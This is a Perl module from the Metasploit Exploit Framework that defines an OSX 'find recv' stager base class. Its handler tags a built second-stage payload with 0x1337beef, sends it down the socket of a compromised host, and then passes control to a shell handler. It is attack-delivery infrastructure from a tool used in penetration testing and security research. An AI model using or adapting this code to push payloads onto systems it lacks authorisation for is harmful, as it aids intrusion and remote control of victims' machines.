###############
##
#
#    Name: FindRecvStager.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      Architecture independent find recv stager base class for OSX.
#
##
###############

package Msf::PayloadComponent::OSX::FindRecvStager;

use strict;
use base 'Msf::PayloadComponent::OSX::Payload';
use vars qw{@ISA};

#
# Dynamically inherit Payload from FindConnection
#
sub _Load
{
	Msf::PayloadComponent::OSX::Payload->_Import('Msf::PayloadComponent::FindConnection');

	__PACKAGE__->SUPER::_Load();
}

#
# Handle the child socket that's passed to us by dishing out the tag
#
sub ChildHandler
{
	my $self  = shift;
	my $sock  = shift;
	my $stage = $self->BuildPayload($self->StagePayload);
	my $data  = pack('N', 0x1337beef) . $stage;

	eval { $sock->send($data); };

	# XXX: We should only do this if the second stage is a shell payload...
	return $self->SUPER::ChildHandler($sock);
}

1;
